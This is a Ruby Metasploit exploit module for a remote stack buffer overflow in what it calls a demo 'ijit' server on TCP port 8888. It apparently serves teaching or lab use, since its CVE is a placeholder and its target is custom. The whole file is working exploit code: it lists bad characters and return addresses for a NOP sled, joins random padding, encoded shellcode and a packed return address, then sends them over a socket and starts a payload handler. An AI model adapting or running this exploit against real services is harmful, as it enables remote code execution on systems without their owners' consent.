##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ijit Demo Buffer Overflow',
      'Description'    => %q{
         Simple demo buffer overflow for custom "ijit" server.
      },
      'Author'         => [ 'OSL' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', 'xxxx-yyyy' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00\x20\x0a\x0d\x0b\x0c\x09",
        },
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'ijit buffer start', { 'Ret' => 0x3badc040 } ],
          [ 'ijit sled middle', { 'Ret' => 0x3badc240 } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'November 2017'))

    register_options(
      [
        Opt::RPORT(8888)
      ])
  end

  def exploit
    print_status("Connecting to target...")
    connect

    sock.get_once

	shellcode = payload.encoded
    outbound = rand_text_alphanumeric(32) + payload.encoded + [target.ret].pack('Q') 
    print_status("Outbound data: \"#{outbound}\"")
	hexed = shellcode.dump
    print_status("Payload in hex: \"#{hexed}\"")

    print_status("Trying target #{target.name}...")

    sock.put(outbound)

    handler
    disconnect
  end
end
